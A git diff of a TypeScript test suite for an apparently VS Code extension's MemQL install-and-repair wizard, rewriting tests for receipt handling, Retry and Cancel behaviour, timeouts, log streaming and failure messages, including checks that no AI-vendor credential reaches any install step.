+    await until(() => /data-act="begin"/.test(h.html()), "the repair form");
+    assert.equal(h.panel.title, "Repair MemQL");
+    type(h, "ownerFirstName", "Ada");
+    type(h, "ownerLastName", "Lovelace");
+    type(h, "ownerEmail", "ada@example.com");
+    h.post({ type: "begin" });
+    await until(() => runner.calls.some((c) => c.capability === "install.dockerAccess"), "the graph to be entered");
+    assert.ok(!runner.calls.some((c) => c.capability === "install.verifyProviderKey"), "a keyless repair called a vendor");
+  } finally {
+    h.close();
+  }
+});
 
 test("an old receipt's recorded key does not come back", async () => {
-  // THE UPGRADE CASE, and the reason this is a test rather than an assumption:
-  // an operator's `~/.memql/install-receipt.json` outlives the extension that
-  // wrote it. A receipt written before this epic still has a `providerKey`
-  // entry with `key-file` and `provider` in its params, sitting on disk.
-  //
-  // Nothing may read it: not onto the form, and not onto the wire. Passing
-  // either to a capability script that no longer declares it is an exit 2 --
-  // "a fault in MemQL rather than in your machine" -- on a repair that would
-  // otherwise have worked.
+  // A receipt written before epic memql#5088 still has a `providerKey` entry
+  // with `key-file` and `provider` in its params. Nothing may read it.
   const runner = await fakeRunner();
-  const h = open({
+  const h = await open({
     action: "repair",
     runner,
     verdict: "installed-unreachable",
+    registered: true,
     receipt: {
       version: 1,
       graph: "install",
@@ -427,9 +689,6 @@ test("an old receipt's recorded key does not come back", async () => {
       updatedAt: "2026-08-01T00:00:00Z",
       entries: [
         {
-          // Exactly what a pre-memql#5088 install wrote, under the step's old
-          // id. Left verbatim: the point is that a receipt in the wild is not
-          // rewritten, so the reader has to be the thing that stops.
           stepId: "providerKey",
           script: "install.verifyProviderKey",
           receipt: "",
@@ -440,10 +699,6 @@ test("an old receipt's recorded key does not come back", async () => {
           recordedAt: "2026-08-01T00:00:00Z",
         },
         {
-          // The bootstrap answers, which a real install records and a repair
-          // has to recover (znasllc-io#3888). Without them the repair stops on
-          // the form asking for the owner -- correctly -- and this case would
-          // never reach a run.
           stepId: "seedBootstrap",
           script: "install.seedBootstrap",
           receipt: "",
@@ -463,202 +718,48 @@ test("an old receipt's recorded key does not come back", async () => {
     },
   });
   try {
-    // Waiting on the OWNER pre-fill, not on the absence of the key: an
-    // assertion that a value never appears passes instantly against a form
-    // that has not been rendered yet. This is the reachable positive that
-    // proves the receipt was actually read.
-    await until(() => h.html().includes("owner@example.com"), "the receipt to be read");
+    // The reachable positive: the receipt was read (the owner is pre-filled,
+    // and summarised beside "More options").
+    await until(() => h.html().includes("Ada Lovelace"), "the receipt to be read");
     assert.ok(!h.html().includes(STALE_KEY_PATH), "the recorded key path was pre-filled onto the form");
-
     h.post({ type: "begin" });
-    await until(() => runner.calls.length > 0, "the graph to be entered");
-    await until(
-      () => runner.calls.some((c) => c.capability === "install.seedBootstrap"),
-      "the bootstrap step",
-    );
-
-    assert.ok(
-      !runner.calls.some((c) => c.capability === "install.verifyProviderKey"),
-      "a repair over an old receipt made an authenticated call to an AI vendor",
-    );
+    await until(() => runner.calls.some((c) => c.capability === "install.seedBootstrap"), "the bootstrap step");
+    assert.ok(!runner.calls.some((c) => c.capability === "install.verifyProviderKey"));
     for (const call of runner.calls) {
       for (const flag of Object.keys(call.params)) {
-        assert.ok(
-          !/provider|key-file|vendor|secret|token/i.test(flag),
-          `${call.capability} was handed --${flag} off an old receipt`,
-        );
+        assert.ok(!/provider|key-file|vendor|secret|token/i.test(flag), `${call.capability} was handed --${flag}`);
       }
     }
   } finally {
     h.close();
   }
 });
-
-// -----------------------------------------------------------------------------
-// Defect 2: Retry must RE-INVOKE, not repaint
-// -----------------------------------------------------------------------------
-
-test("Retry runs the graph again rather than repainting a pending step", async () => {
-  // FAILS A STEP THAT ACTUALLY RUNS (epic memql#5088). It used to fail
-  // `install.verifyProviderKey`, which the plan now skips on this lane -- so
-  // nothing would have failed and the wait for the failed-step screen would
-  // have timed out.
-  //
-  // `install.dockerAccess` RATHER THAN THE FIRST MUTATING STEP, and the
-  // difference is not cosmetic: it occupies the graph position the provider
-  // check used to, sharing wave 2 with it and with nothing else. Retry is
-  // swallowed while a run is still in flight (`startRun` returns early on
-  // `runAbort`), so a failure with concurrent siblings still running renders
-  // the retry screen and then ignores the click -- which is what
-  // `install.binary` did here, three steps at once alongside two sudo steps
-  // and a clone. A wave that settles the moment its one step fails is what
-  // makes this test about Retry rather than about timing.
-  const runner = await fakeRunner({ "install.dockerAccess": 3 });
-  const h = open({ runner });
-  try {
-    beginInstall(h);
-    await until(() => /data-act="retry"/.test(h.html()), "the failed-step screen");
-    const before = runner.calls.length;
-
-    // The operator fixes what was wrong -- in another window, which is exactly
-    // why Retry is offered on every failure -- and presses Retry.
-    runner.failing.clear();
-    h.post({ type: "retry" });
-    await until(() => runner.calls.length > before, "a second invocation");
-
-    assert.ok(
-      runner.calls.length > before,
-      "Retry must execute something; `state.retry()` plus a repaint executes nothing",
-    );
-    await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
-  } finally {
-    h.close();
-  }
-});
-
-test("Switch-to-guided re-invokes for the same reason Retry does", async () => {
-  // See the Retry case above for why this is `install.dockerAccess` and not
-  // the provider step (epic memql#5088).
-  const runner = await fakeRunner({ "install.dockerAccess": 5 });
-  const h = open({ runner });
-  try {
-    beginInstall(h);
-    await until(() => /data-act="guided"/.test(h.html()), "the failed-step screen");
-    const before = runner.calls.length;
-
-    runner.failing.clear();
-    h.post({ type: "guided" });
-    await until(() => runner.calls.length > before, "a second invocation");
-  } finally {
-    h.close();
-  }
-});
-
-// -----------------------------------------------------------------------------
-// Defect 3: a failed run must STAY on the screen carrying the recoveries
-// -----------------------------------------------------------------------------
-
-test("a settled run with a failed step still offers Retry, and does not claim it finished", async () => {
-  // See the Retry case above for why this is `install.dockerAccess` and not
-  // the provider step (epic memql#5088).
-  const runner = await fakeRunner({ "install.dockerAccess": 3 });
-  const h = open({ runner });
-  try {
-    beginInstall(h);
-    // Settled: the executor has blocked the dependent subtree and returned. The
-    // defect was calling `finish()` here, which moves to `done`.
-    await until(() => /failed/.test(h.html()), "a failure to be reported");
-    await until(
-      () => !runner.calls.some(() => false) && /data-act="retry"/.test(h.html()),
-      "the failed-step screen",
-    );
-    // Let anything still in flight settle, then assert what is on screen.
-    await new Promise((resolve) => setTimeout(resolve, 20));
-
-    const html = h.html();
-    assert.match(html, /data-act="retry"/, "the failed run must keep Retry reachable");
-    assert.match(html, /data-act="guided"/, "and Switch-this-step-to-guided with it");
-    assert.doesNotMatch(
-      html,
-      /Nothing further to do/,
-      'a failed install must never render the "Finished" screen',
-    );
-  } finally {
-    h.close();
-  }
-});
-
-// -----------------------------------------------------------------------------
-// Defect 4: every step must be handed a timeout
-// -----------------------------------------------------------------------------
 
 test("every step is invoked with a non-zero timeout", async () => {
-  const runner = await fakeRunner();
-  const h = open({ runner });
+  const h = await open({});
   try {
     beginInstall(h);
-    await until(() => runner.calls.length > 0, "the first step");
-    await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
-
-    assert.ok(runner.calls.length > 1, "the whole graph should have run");
-    for (const call of runner.calls) {
-      // `runner.ts`: "0 or absent means no timeout". Absent is not a default,
-      // it is the REMOVAL of the ceiling -- which is how this went missing the
-      // first time, with the field present in SessionOptions and never passed.
-      assert.ok(
-        typeof call.timeoutMs === "number" && call.timeoutMs > 0,
-        `step ${call.capability} was given no timeout ceiling`,
-      );
+    await until(() => INSTALLED.test(h.html()), "the run to settle");
+    assert.ok(h.runner.calls.length > 1, "the whole graph should have run");
+    for (const call of h.runner.calls) {
+      assert.ok(typeof call.timeoutMs === "number" && call.timeoutMs > 0, `step ${call.capability} was given no timeout`);
     }
   } finally {
     h.close();
   }
 });
-
-// -----------------------------------------------------------------------------
-// The provider is COLLECTED, and what is collected is what runs (memql#3473)
-// -----------------------------------------------------------------------------
-
-// TWO PROVIDER CASES ARE REPLACED HERE (epic memql#5088) by the one below.
-//
-//   - `the collect screen offers a provider, as a choice rather than a box`
-//     asserted the vendor was a `<select>` with both supported values, because
-//     a free-text box could hold anything and the script exits 2 on a value
-//     outside its set.
-//   - `the provider the operator chose is the provider the step verifies`
-//     asserted the chosen vendor reached BOTH `install.verifyProviderKey` and
-//     `install.seedBootstrap` -- the defect being that `provider` was hardcoded
-//     here AND pinned in install.json, where graph params win.
-//
-// Neither field is collected and neither script declares the flag. What must
-// hold now is that the panel, driven end to end, hands no vendor credential to
-// anything.
 
 test("the panel hands no AI credential to any step, and calls no vendor", async () => {
-  // DRIVEN THROUGH THE WHOLE RUN rather than asserted on the plan, because the
-  // plan is already covered in zeroKeyInstall.test.ts and this lane's value is
-  // that it is the REAL panel over the REAL graph and executor, with only
-  // script execution faked (memql#3514).
-  const runner = await fakeRunner();
-  const h = open({ runner });
+  const h = await open({});
   try {
     beginInstall(h);
-    await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
-
-    // The reachable positive first: a scan over an empty call list passes
-    // identically to a scan over a full one.
-    assert.ok(runner.calls.length > 1, "the whole graph should have run");
-    assert.ok(
-      !runner.calls.some((c) => c.capability === "install.verifyProviderKey"),
-      "the install made an authenticated call to an AI vendor",
-    );
-    for (const call of runner.calls) {
+    await until(() => INSTALLED.test(h.html()), "the run to settle");
+    assert.ok(h.runner.calls.length > 1);
+    assert.ok(!h.runner.calls.some((c) => c.capability === "install.verifyProviderKey"));
+    for (const call of h.runner.calls) {
       for (const [flag, value] of Object.entries(call.params)) {
-        assert.ok(
-          !/provider|key-file|vendor|secret|token|credential/i.test(flag),
-          `${call.capability} was handed --${flag}`,
-        );
-        assert.doesNotMatch(String(value), /^sk-/, `${call.capability} --${flag} carries a key`);
+        assert.ok(!/provider|key-file|vendor|secret|token|credential/i.test(flag), `${call.capability} was handed --${flag}`);
+        assert.doesNotMatch(String(value), /^sk-/);
       }
     }
   } finally {
@@ -666,346 +767,340 @@ test("the panel hands no AI credential to any step, and calls no vendor", async 
   }
 });
 
-// -----------------------------------------------------------------------------
-// Typing must not repaint the page under the cursor (memql#3538)
-// -----------------------------------------------------------------------------
-
-test("typing a character does not replace the document the operator is typing into", () => {
-  // THE DEFECT, stated as the operator meets it: type one character into any
-  // box on this screen and the caret is gone, because the keystroke posted an
-  // `input` message and the handler answered it with a full `render()`.
-  // Assigning `webview.html` reloads the whole document -- there is no
-  // surviving focused element on the other side of it -- so the form could only
-  // be filled one click-and-character at a time.
-  //
-  // The count is asserted rather than the focus because focus is a property of
-  // a DOM this lane does not have. It is the same fact: a document that was
-  // never replaced still has whatever the operator was doing in it.
-  const h = open({});
+test("the tab is called what the page is doing", async () => {
+  const h = await open({});
   try {
+    await until(() => /Install MemQL on this computer/.test(h.html()), "the landing");
+    assert.equal(h.panel.title, "Add a cluster");
     h.post({ type: "choose", value: "install" });
-    const painted = h.panel.renders;
-
-    h.post({ type: "input", value: { field: "ownerFirstName", text: "A" } });
-    h.post({ type: "input", value: { field: "ownerFirstName", text: "Ad" } });
-    h.post({ type: "input", value: { field: "ownerFirstName", text: "Ada" } });
-
-    assert.equal(
-      h.panel.renders,
-      painted,
-      "three keystrokes repainted the page, so the operator lost focus three times",
-    );
+    assert.equal(h.panel.title, "Install MemQL");
+    h.post({ type: "back" });
+    await until(() => h.panel.title === "Add a cluster", "the landing's title");
+    h.post({ type: "choose", value: "connect" });
+    assert.equal(h.panel.title, "Add a cluster");
   } finally {
     h.close();
   }
 });
 
-test("what was typed without a repaint is still there when one comes", async () => {
-  // The other half, and the reason the keystroke message is KEPT rather than
-  // removed with the render it triggered. The extension is where form state
-  // lives -- the DOM is discarded on every repaint -- so a screen that stopped
-  // recording keystrokes would hand the next render an empty form. Recording
-  // without repainting is the whole fix.
-  const h = open({});
+test("the form shows only what must be decided, and Install lives on the bar", async () => {
+  const h = await open({});
   try {
     h.post({ type: "choose", value: "install" });
-    h.post({ type: "input", value: { field: "ownerFirstName", text: "Ada" } });
-    h.post({ type: "input", value: { field: "ownerLastName", text: "Lovelace" } });
-
-    // An action repaints -- here the incomplete form's refusal to start.
-    // `begin` is still async, so the repaint it causes is one tick away.
-    h.post({ type: "begin" });
-    await until(() => /is required/.test(h.html()), "the refusal to repaint");
-
+    await until(() => /data-act="begin"/.test(h.html()), "the form");
     const html = h.html();
-    assert.match(html, /value="Ada"/, "the name typed before the repaint survived it");
-    assert.match(html, /value="Lovelace"/, "and so did the one typed after it");
+    assert.match(html, /data-field="ownerFirstName"/);
+    assert.match(html, /id="more-options" hidden/, "domain and version wait behind More options");
+    assert.deepEqual(barActs(html), ["back", "begin"], "Cancel then Install, and nothing else");
   } finally {
     h.close();
   }
 });
 
-// -----------------------------------------------------------------------------
-// The steps AHEAD, and every failure rather than one of them (memql#3474)
-// -----------------------------------------------------------------------------
-
-test("the steps ahead are on screen while the first one is still running", () => {
-  // `pending` was unreachable in a forward run: a step first appeared when it
-  // STARTED. All six states rendered correctly and all six were unit-tested by
-  // feeding them in directly, and none of that put one on screen ahead of its
-  // turn -- so an operator ten minutes into an install could not see how much
-  // was left.
-  //
-  // The gate is what makes this observable: the first step does not return
-  // until the assertion has been made, so the run is genuinely mid-flight.
-  return (async () => {
-    const runner = await fakeRunner();
-    let release = (): void => undefined;
-    const gate = new Promise<void>((resolve) => {
-      release = resolve;
-    });
-    const inner = runner.run;
-    let entered = 0;
-    let gated = true;
-    runner.run = async (run) => {
-      entered += 1;
-      // The choose-time platform probe is the first detect. Hold the NEXT
-      // invocation -- the graph's detect -- so the run is mid-flight.
-      if (gated && entered >= 2) {
-        gated = false;
-        await gate;
-      }
-      return inner(run);
-    };
-
-    const h = open({ runner });
-    try {
-      beginInstall(h);
-      // `calls` is recorded by the inner runner, which the gate is holding --
-      // so the wrapper's own counter is what says the step is in flight.
-      await until(() => entered >= 2, "the graph detect to be in flight");
-      // Drain the render that followed `stepStarted`.
-      await new Promise((resolve) => setTimeout(resolve, 5));
-
-      const html = h.html();
-      assert.match(html, /detect/, "the running step is on screen");
-      assert.match(
-        html,
-        /enrolmentLink|enrolment/i,
-        "so is the LAST step of the graph, which has not started and may never",
-      );
-
-      release();
-      await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
-    } finally {
-      release();
-      h.close();
-    }
-  })();
+test("typing is recorded and patched, never a new document once the page is live", async () => {
+  // THE DEFECT memql#3538 fixed by not rendering at all; the kit fixes it by
+  // patching. Once the page has said `ready`, a keystroke changes regions and
+  // never re-assigns the document the operator is typing into.
+  const h = await open({});
+  try {
+    h.post({ type: "choose", value: "install" });
+    await until(() => /data-act="begin"/.test(h.html()), "the form");
+    h.post({ type: "ready" });
+    const painted = h.panel.renders;
+    type(h, "ownerFirstName", "A");
+    type(h, "ownerFirstName", "Ad");
+    type(h, "ownerFirstName", "Ada");
+    assert.equal(h.panel.renders, painted, "a keystroke replaced the document");
+  } finally {
+    h.close();
+  }
 });
 
-test("a wave with several failures explains each of them, not one at random", async () => {
-  // The executor runs a wave under Promise.all and deliberately lets
-  // independent branches finish, so the operator sees every failure this run
-  // has. The failure SCREEN then showed guidance for whichever one resolved
-  // last -- a scheduling accident -- though the codes ask for different things:
-  // exit 4 says go and install something, exit 3 says the step protected
-  // something and will refuse again.
-  const runner = await fakeRunner({ "install.binary": 4, "install.hostsEntries": 3 });
-  const h = open({ runner });
+test("what was typed is still there when the form repaints for a refusal", async () => {
+  const h = await open({});
+  try {
+    h.post({ type: "choose", value: "install" });
+    type(h, "ownerFirstName", "Ada");
+    type(h, "ownerLastName", "Lovelace");
+    h.post({ type: "begin" });
+    await until(() => /Enter your email address\./.test(h.html()), "the refusal");
+    const html = h.html();
+    assert.match(html, /value="Ada"/);
+    assert.match(html, /value="Lovelace"/);
+    assert.match(html, /Check the details/);
+  } finally {
+    h.close();
+  }
+});
+
+test("the run's status and step count come from the state machine, while it runs", async () => {
+  // The step checklist is gone from the run screen; "Step n of m" is how much
+  // is left, and the status line is the running step's short label.
+  const runner = await fakeRunner();
+  const gate = gateOn(runner, "install.dockerAccess");
+  const h = await open({ runner });
   try {
     beginInstall(h);
-    await until(() => /data-act="retry"/.test(h.html()), "the failed-step screen");
-    // The first refusal renders Retry while independent tool checks still run.
-    // Wait for the whole fake failure wave before inspecting its summary.
-    await until(
-      () => ["toolK3d", "toolKubectl", "toolMkcert", "hostsBlock"].every((step) =>
-        h.html().includes(`data-step-id="${step}" data-state="failed"`)),
-      "all four failures to reach the screen",
-    );
-
+    await until(gate.reached, "the second step to be in flight");
+    await until(() => /Checking Docker/.test(h.html()), "the status line");
     const html = h.html();
-    assert.match(html, /steps failed/, "the heading counts them rather than naming one");
-    assert.match(
-      html,
-      /Something this step needs is not on this machine/,
-      "exit 4's guidance, for the tool steps",
-    );
-    assert.match(html, /The step refused to act/, "exit 3's guidance, for the hosts block");
-    assert.match(
-      html,
-      /Retry these steps/,
-      'the label must not say "this step" in front of four failures',
-    );
+    assert.match(html, /Installing MemQL/);
+    assert.match(html, /Step 2 of 1[0-9]/);
+    assert.deepEqual(barActs(html), ["cancel"], "Cancel, as a text act, and nothing else");
+    gate.release();
+    await until(() => INSTALLED.test(h.html()), "the run to settle");
   } finally {
+    gate.release();
     h.close();
   }
 });
 
-test("Create deployment on an unsupported platform refuses instead of listing tags", async () => {
+test("log lines and phases travel as messages; the document is not replaced per line", async () => {
+  // THE DEFECT: every stderr line assigned a whole new document, so focus,
+  // selection and the bar's animation were lost roughly once a second.
   const runner = await fakeRunner();
   const inner = runner.run;
-  const darwin =
-    "unsupported platform darwin/amd64: the local cluster installer targets linux/amd64, darwin/arm64";
+  let emitted = false;
+  let release = (): void => {};
+  const held = new Promise<void>((resolve) => {
+    release = resolve;
+  });
   runner.run = async (run) => {
-    if (run.capability === "install.detect") {
-      runner.calls.push(run);
-      return {
-        argv: [run.scriptPath],
-        exitCode: 3,
-        signal: null,
-        stdout: "",
-        stderr: darwin,
-        envelope: {
-          ok: false,
-          capability: "install.detect",
-          changed: false,
-          result: { os: "darwin", arch: "arm64", supported: false },
-          error: { code: 3, message: darwin },
-        },
-      };
+    if (run.capability === "install.dockerAccess") {
+      for (let i = 0; i < 200; i += 1) run.onLog?.(`line ${i}`);
+      emitted = true;
+      await held;
     }
     return inner(run);
   };
-  const h = open({ runner });
+  const h = await open({ runner });
   try {
-    h.post({ type: "choose", value: "install" });
-    await until(() => /linux\/amd64/.test(h.html()), "the refused-platform screen");
-    const html = h.html();
-    assert.match(html, /will not change that/);
-    assert.doesNotMatch(html, /The step refused to act/, "must not use generic exit-3 artifact copy");
-    assert.doesNotMatch(html, /data-field="version"/, "must not offer a tag list that cannot run");
-    assert.ok(
-      runner.calls.every((c) => c.capability === "install.detect"),
-      "only detect may run",
+    beginInstall(h);
+    await until(() => /Installing MemQL/.test(h.html()), "the run screen");
+    h.post({ type: "ready" });
+    const before = h.panel.renders;
+    await until(() => emitted, "the lines");
+    await until(
+      () => h.panel.posted.some((m) => (m as { type?: string }).type === "log"),
+      "the lines to cross as a log message",
     );
+    await new Promise((resolve) => setTimeout(resolve, 150));
+    assert.equal(h.panel.renders, before, "a log line replaced the document");
+    const lines = h.panel.posted
+      .filter((m) => (m as { type?: string }).type === "log")
+      .flatMap((m) => (m as { lines: { text: string; label?: string }[] }).lines);
+    assert.equal(lines.filter((l) => /^line \d+$/.test(l.text)).length, 200);
+    // THE LABEL ONCE, where the step's lines begin -- not on every line.
+    assert.equal(lines.filter((l) => l.label === "Checking Docker").length, 1);
+    assert.ok(progressPosts(h).length > 0, "the bar moves by message");
+    release();
+    await until(() => shows(h, INSTALLED), "the run to settle");
   } finally {
+    release();
     h.close();
   }
 });
 
 // -----------------------------------------------------------------------------
-// The hand-off gate, which the same shape of defect would hide
+// install: Cancel, and failures
 // -----------------------------------------------------------------------------
 
-test("a completed install registers the cluster and offers sign-in", async () => {
+test("Cancel says it is stopping until the run has actually stopped", async () => {
+  // THE DEFECT: Cancel moved straight to "Cancelled" while the current wave
+  // -- up to thirty minutes of cluster step -- kept working.
   const runner = await fakeRunner();
-  const h = open({ runner });
+  const gate = gateOn(runner, "install.dockerAccess");
+  const h = await open({ runner });
   try {
     beginInstall(h);
-    await until(() => /Your cluster is ready/.test(h.html()), "the hand-off screen");
-
-    assert.match(h.html(), /data-act="signInAsOwner"/);
-    assert.ok(fs.existsSync(h.clustersPath), "the cluster must land in the registry");
-    assert.ok(
-      recorded.executed.includes("memql.clusters.refresh"),
-      "the tree must be told there is a new cluster",
-    );
-  } finally {
-    h.close();
-  }
-});
-
-test("a cancelled run hands nothing off, and leaves a receipt that describes what ran", async () => {
-  const runner = await fakeRunner();
-  const h = open({ runner });
-  try {
-    beginInstall(h);
-    await until(() => runner.calls.length > 0, "the first step");
+    await until(gate.reached, "a step in flight");
     h.post({ type: "cancel" });
-    await until(() => /Cancelled/.test(h.html()), "the cancelled screen");
-    // The screen turns over on the KEYSTROKE; the executor stops at the next
-    // wave boundary, and the in-flight wave writes its receipt entries on the
-    // way out. Waiting for the file is waiting for that -- and it is the
-    // property under test, so a timeout here names it.
-    await until(() => fs.existsSync(h.receiptFile), "the receipt a cancelled run still leaves");
-
-    assert.doesNotMatch(
-      h.html(),
-      /Your cluster is ready/,
-      "a cancelled run is `ok` -- everything that ran, worked -- and must not be handed off",
-    );
-    assert.ok(!fs.existsSync(h.clustersPath), "nothing may be registered for a cancelled install");
+    const stopping = h.html();
+    assert.match(stopping, /Stopping after the current step/);
+    assert.deepEqual(barActs(stopping), [], "nothing to press while it stops");
+    assert.doesNotMatch(stopping, /Stopped</);
+    gate.release();
+    await until(() => /data-act="resume"/.test(h.html()), "the stopped screen");
+    assert.match(h.html(), /Stopped/);
+    assert.ok(!fs.existsSync(h.clustersPath), "nothing may be registered for a stopped install");
+    assert.ok(fs.existsSync(h.receiptFile), "and what ran is recorded, so it can be uninstalled");
   } finally {
+    gate.release();
     h.close();
   }
 });
 
-// -----------------------------------------------------------------------------
-// The key file can be PICKED, not only typed (memql#3547)
-// -----------------------------------------------------------------------------
-
-// THE FOUR FILE-PICKER CASES ARE DELETED (epic memql#5088). All four were
-// about `providerKeyFile`, the one field that named a file: that it alone
-// offered a Browse button, that choosing a file filled the box (and that the
-// dialog asked for exactly one FILE, since a `--key-file` flag takes one path
-// and a directory is not a key), that cancelling left the form untouched
-// rather than clearing it, and that a picked path was validated by the same
-// rule a typed one was.
-//
-// No field names a file now, so `browseForKeyFile`, `keyDialogStartDir` and
-// `keyFileProblem` are gone from the panel with the picker they served.
-//
-// WHAT IS LOST WITH THEM, said rather than implied: this was the only coverage
-// of `vscode.window.showOpenDialog` in the extension, and of the panel's
-// handling of a cancelled dialog. If a picker is ever added for another field,
-// those two properties need testing again -- an empty dialog result read as
-// "the operator chose nothing, so clear it" is the mistake, and it is
-// invisible when it happens.
-
-test("no field offers a file picker, and the panel answers no browse message", () => {
-  // A REPLACEMENT WITH A REACHABLE POSITIVE. Asserting only that the button is
-  // absent would pass against a screen that failed to render at all, so the
-  // form is checked to be present first.
-  const h = open({});
+test("a failure while other steps finish offers nothing, then Retry once the run is over", async () => {
+  // THE DEFECT: the failure screen appeared on the first failed step while
+  // other branches kept running, Retry was offered, the click was dropped
+  // (the old run held the lock), and the page ended on "Finished / Nothing
+  // further to do".
+  const runner = await fakeRunner({ "install.binary": 5 });
+  const gate = gateOn(runner, "install.cloneStack");
+  const h = await open({ runner });
   try {
-    h.post({ type: "choose", value: "install" });
-    const html = h.html();
-    assert.match(html, /data-field="ownerEmail"/, "the collect screen did not render");
-    assert.doesNotMatch(html, /data-act="browseKeyFile"/, "a key-file picker is back");
-    assert.doesNotMatch(html, /class="secondary browse"/, "a browse control is back");
+    beginInstall(h);
+    await until(gate.reached, "the sibling step in flight");
+    await until(() => /Finishing other steps/.test(h.html()), "the failure, still finishing");
+    assert.deepEqual(barActs(h.html()), [], "no Retry while the run is still in flight");
+    assert.match(h.html(), /Couldn't install tools/, "the status names the failed step in the negative");
+    const before = h.runner.calls.length;
+    // THE WALL BEHIND THE ABSENT ACT: a Retry that arrives anyway (a stale
+    // page, a double click) is not taken. Taken, it reset the failure while
+    // the old run still held the lock, and the page ended on a run that
+    // never reported again.
+    h.post({ type: "retry" });
+    assert.match(h.html(), /Finishing other steps/, "a Retry was taken while the run was still in flight");
+    assert.match(h.html(), /Couldn't install tools/, "and the failure it would have wiped is still on screen");
+    gate.release();
+    await until(() => /data-act="retry"/.test(h.html()), "Retry, once the run is over");
+    assert.equal(h.runner.calls.length >= before, true);
+    assert.doesNotMatch(h.html(), /Nothing further to do|Finished/);
+    // And now it re-runs.
+    h.runner.failing.clear();
+    const settled = h.runner.calls.length;
+    h.post({ type: "retry" });
+    await until(() => h.runner.calls.length > settled, "a second invocation");
+    await until(() => INSTALLED.test(h.html()), "the retried run");
+  } finally {
+    gate.release();
+    h.close();
+  }
+});
 
-    // And the message it answered is unhandled: posting it must be inert
-    // rather than opening a dialog.
-    h.post({ type: "browseKeyFile" });
-    assert.equal(recorded.openDialogs.length, 0, "the panel still opens a file dialog");
+test("Retry runs the graph again rather than repainting a pending step", async () => {
+  const h = await open({ runner: await fakeRunner({ "install.dockerAccess": 5 }) });
+  try {
+    beginInstall(h);
+    await until(() => /data-act="retry"/.test(h.html()), "the failed screen");
+    const before = h.runner.calls.length;
+    h.runner.failing.clear();
+    h.post({ type: "retry" });
+    await until(() => h.runner.calls.length > before, "a second invocation");
+    await until(() => INSTALLED.test(h.html()), "the run to settle");
   } finally {
     h.close();
   }
 });
 
-// -----------------------------------------------------------------------------
-// A privileged remedy is handed to the operator, not run for them (memql#3551)
-// -----------------------------------------------------------------------------
+test("a settled failure keeps Retry, names the step, and never claims to be finished", async () => {
+  const h = await open({ runner: await fakeRunner({ "install.dockerAccess": 5 }) });
+  try {
+    beginInstall(h);
+    await until(() => /data-act="retry"/.test(h.html()), "the failed screen");
+    const html = h.html();
+    assert.match(html, /Couldn't check Docker/);
+    assert.deepEqual(barActs(html).slice(-2), ["leave", "retry"], "Cancel, then Retry as the one button");
+    assert.doesNotMatch(html, /guided/i);
+    assert.doesNotMatch(html, /Nothing further to do/);
+    // The log opened itself on the failure.
+    assert.doesNotMatch(html, /id="run-logs" hidden/);
+  } finally {
+    h.close();
+  }
+});
+
+test("a failure that cannot be fixed by retrying offers no Retry", async () => {
+  // Exit 3 is a refusal: retried unchanged it refuses again.
+  const h = await open({ runner: await fakeRunner({ "install.dockerAccess": 3 }) });
+  try {
+    beginInstall(h);
+    await until(() => /Couldn't install/.test(h.html()) && !/Finishing other steps/.test(h.html()), "the failed screen");
+    assert.doesNotMatch(h.html(), /data-act="retry"/);
+    assert.deepEqual(barActs(h.html()), ["leave"]);
+  } finally {
+    h.close();
+  }
+});
+
+test("a wave with several failures explains each of them, by the step's name", async () => {
+  const h = await open({ runner: await fakeRunner({ "install.binary": 4, "install.hostsEntries": 5 }) });
+  try {
+    beginInstall(h);
+    await until(() => /Couldn't install</.test(h.html()), "the failed screen");
+    const html = h.html();
+    assert.match(html, /Couldn&#39;t install tools: |Couldn't install tools: /);
+    assert.match(html, /Couldn&#39;t add local addresses: |Couldn't add local addresses: /);
+  } finally {
+    h.close();
+  }
+});
+
+test("the failure's words are the script's and the fix, never the executor's record", async () => {
+  // THE DEFECT: "exit 5: ..." and "the script exited 0 but its verify did not
+  // hold: result.x did not satisfy resultTrue" reached the page. They go to
+  // the log; the page says what the script said.
+  const h = await open({ runner: await fakeRunner({ "install.dockerAccess": 5 }) });
+  try {
+    beginInstall(h);
+    await until(() => /data-act="retry"/.test(h.html()), "the failed screen");
+    const html = h.html();
+    assert.match(html, /The fake refused install\.dockerAccess\./);
+    assert.doesNotMatch(html, /exit 5|verify did not hold|resultTrue|capability/);
+  } finally {
+    h.close();
+  }
+});
+
+test("the log opens AT the failed step, not at its tail", async () => {
+  const runner = await fakeRunner({ "install.dockerAccess": 5 });
+  const inner = runner.run;
+  runner.run = async (run) => {
+    if (run.capability === "install.detect") run.onLog?.("Platform: darwin/arm64");
+    if (run.capability === "install.dockerAccess") run.onLog?.("docker: permission denied");
+    return inner(run);
+  };
+  const h = await open({ runner });
+  try {
+    beginInstall(h);
+    await until(() => /Installing MemQL/.test(h.html()), "the run");
+    h.post({ type: "ready" });
+    await until(() => shows(h, /data-act="retry"/), "the failure");
+    const reset = h.panel.posted
+      .filter((m) => (m as { type?: string; reset?: boolean }).type === "log" && (m as { reset?: boolean }).reset === true)
+      .at(-1) as { lines: { text: string; anchor?: boolean; label?: string }[] } | undefined;
+    assert.ok(reset !== undefined, "the log was re-sent for the failure");
+    const anchored = reset.lines.find((l) => l.anchor === true);
+    assert.equal(anchored?.text, "docker: permission denied");
+    assert.equal(anchored?.label, "Checking Docker");
+    assert.ok(
+      h.panel.posted.some((m) => (m as { type?: string; id?: string; open?: boolean }).type === "setDisclosure" && (m as { open?: boolean }).open === true),
+      "and the disclosure was opened",
+    );
+  } finally {
+    h.close();
+  }
+});
 
 /** A runner whose named capability fails carrying a remedy in its envelope. */
 async function runnerFailingWithRemedy(capability: string, remedy: string): Promise<FakeRunner> {
-  const fake = await fakeRunner({ [capability]: 4 });
-  const inner = fake.run;
-  fake.run = async (run) => {
-    const outcome = await inner(run);
-    if (run.capability === capability && outcome.envelope) {
-      outcome.envelope.result = { remedy };
-    }
-    return outcome;
-  };
-  return fake;
+  return fakeRunner({ [capability]: 4 }, { [capability]: { remedy } });
 }
 
-test("a failure that names a remedy offers to open it in a terminal", async () => {
-  // WHY THE HANDOFF EXISTS. The runner spawns every capability UNPRIVILEGED --
-  // there is no sudo, pkexec or askpass anywhere in the extension -- and the
-  // install graph has steps that need root. Without this the wizard's only
-  // honest move is to print a command and stop.
+test("a failure that names a remedy offers to run it in a terminal", async () => {
   const remedy = "sudo usermod -aG docker ada";
